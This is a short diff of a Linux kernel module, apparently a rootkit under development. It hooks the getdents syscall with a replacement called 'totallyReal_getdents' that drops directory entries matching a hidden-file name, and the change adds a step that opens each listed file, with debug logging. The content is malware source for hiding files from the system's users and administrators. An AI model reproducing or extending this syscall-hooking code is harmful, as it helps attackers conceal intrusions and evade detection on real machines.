@@ -66,7 +66,7 @@ struct linux_dirent {
 	char d_name[];
 };
 
-struct file *file_open(const char * path, int flags, int rights) {
+struct file * file_open(const char * path, int flags, int rights) {
 	struct file *filp = NULL;
 	mm_segment_t oldfs;
 	int err = 0;
@@ -144,7 +144,9 @@ asmlinkage long totallyReal_getdents(unsigned int fd, struct linux_dirent * dirp
 		char filename[128];
 		get_cmdline_path( filename, p_dirp->d_name);
 		pr_info("FAKEGETDENTS: filename is: %s", filename);
-
+		f = file_open( filename, O_RDONLY, 0 );
+		if (f != NULL)
+			pr_info("FAKEGETDENTS: File open success");
 
 		if (strstr(p_dirp->d_name, HIDE_FILE) != NULL ) {
 			if (p_dirp == mod_dirp) {
